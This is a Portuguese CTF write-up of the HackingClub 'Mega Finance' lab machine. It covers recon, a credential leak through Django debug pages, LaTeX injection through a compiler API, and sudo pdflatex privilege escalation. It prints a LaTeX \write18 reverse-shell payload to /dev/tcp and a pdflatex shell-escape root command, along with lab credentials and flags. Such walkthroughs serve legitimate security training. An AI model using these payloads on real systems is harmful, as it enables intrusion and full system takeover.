#Hacking-Club 

---

<img src="Pasted image 20260209195535.png" align="right" width="300">
Máquina: Mega Finance
Dificuldade: Fácil
Plataforma: HackingClub

## Introdução

O CTF “Mega Finance" é uma máquina Linux, sobre Django, LateX Injection e PrivEsc via sudo.

## Reconhecimento

Iniciei com uma enumeração de portas tcp, utilizando a ferramenta Nmap:

```
nmap -p- -min-rate 1600 -sVC 172.16.4.92 -Pn --open
```

Encontramos as portas:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 00:56:1f:20:1f:6b:d0:21:92:94:e4:86:95:4d:ea:a1 (ECDSA)
|_  256 b0:40:be:73:73:97:df:90:17:d1:e4:9c:84:09:2c:03 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://megafinance.hc/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Ao obtermos o domínio `megafinance.hc` o adicionamos no arquivo `/etc/hosts`, em seguida acessamos a aplicação web.

![[Pasted image 20260209200752.png]]

Ao clicarmos no botão help me  somos redirecionados a página de login que ao utilizar o Wappalyzer identificamos que se trata de uma aplicação feita em Django:

![[Pasted image 20260209201005.png]]

Em seguida, realizamos um fuzzing com o objetivo de encontrar diretórios e arquivos ocultos via `ffuf` encontramos os seguintes diretórios:

```
ffuf -u http://megafinance.hc/FUZZ -w SecLists/Discovery/Web-Content/big.txt -t 150
```

 Diretórios retornados: 

![[Pasted image 20260209201845.png]]

Fazendo uma breve pesquisa, descobri que, geralmente, os desenvolvedores deixam o modo de depuração no Django ativado com a configuração `DEBUG=True`

```
https://blog.vidocsecurity.com/blog/escalation-of-debug-mode-in-django
```

O que é um modo de depuração no Django? O modo de depuração no Django é uma configuração ( DEBUG) que ajuda na fase de desenvolvimento do aplicativo, fornecendo páginas de erro detalhadas quando algo dá errado. De acordo com o Write-Up Mega Finance 4 conteúdo acima, se enviarmos uma rota inexistente, o modo debug trará uma resposta mais detalhada. Então, vamos enviar a rota `/rotaenisxitente`.

![[Pasted image 20260209203140.png]]

Retornando a página de login, interceptamos com Burp Suite e excluímos o campo senha  e enviamos novamente a requisição que retornou um erro como previsto.

![[Pasted image 20260209203835.png]]

Analisando a mensagem de erro descobrirmos uma `URL` de autenticação no domínio em que adicionamos ao arquivo `/etc/hosts`

```
report-api.megafinance.hc
```

![[Captura de tela 2026-02-09 205959.png]]

Em seguida, acessamos a aplicação web e fizermos o login com o usuário:

```
Username: admin
Password: Sn03pRO9%fsjssua
```

Após o login identificamos a presença de um Swagger. A API "Latex Compiler API 1.O", essa API permite o envio de arquivos para compilação LaTex através de requisições POST.

![[Pasted image 20260209210513.png]]

Ao realizarmos uma pesquisa, podemos encontrar um contéudo que mostra como executar comandos ou ler arquivos utilizando o `LaTex`

```
https://0day.work/hacking-with-latex/
```

Em seguida, criamos nossa payload criando um arquivo `.tex`

```
\documentclass{article} \usepackage[utf8]{inputenc} \immediate\write18{/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'} % \begin{document} \section*{Exploração via Reverse Shell} \end{document}
```

Obtemos a flag:

```
hackingclub{20db00f2d84f8340b179c75fc577f343}
```


![[Pasted image 20260209211008.png]]

## Exploração - Obtendo a root flag

Utilizando o comando `sudo -l` foi requerido a senha então reutilizamos a senha que usamos para acessar a aplicação: 

![[Pasted image 20260209211704.png]]

O usuário `patrick` pode executar o comando `/usr/bin/pdflatex` com privilégios elevados para qualquer arquivo. Isso pode ser explorado para escalonamento de privilégios. Com uma breve pesquisa, podemos encontrar uma forma de escalar privilégios para root. Segue o link do conteúdo abaixo:

```
https://gtfobins.github.io/gtfobins/pdflatex/#sudo
```

Executando o comando:

```
sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```

![[Pasted image 20260209212442.png]]

Obtemos a flag

```
hackingclub{db500bb37020ad25a66f17fc06122e38}
```

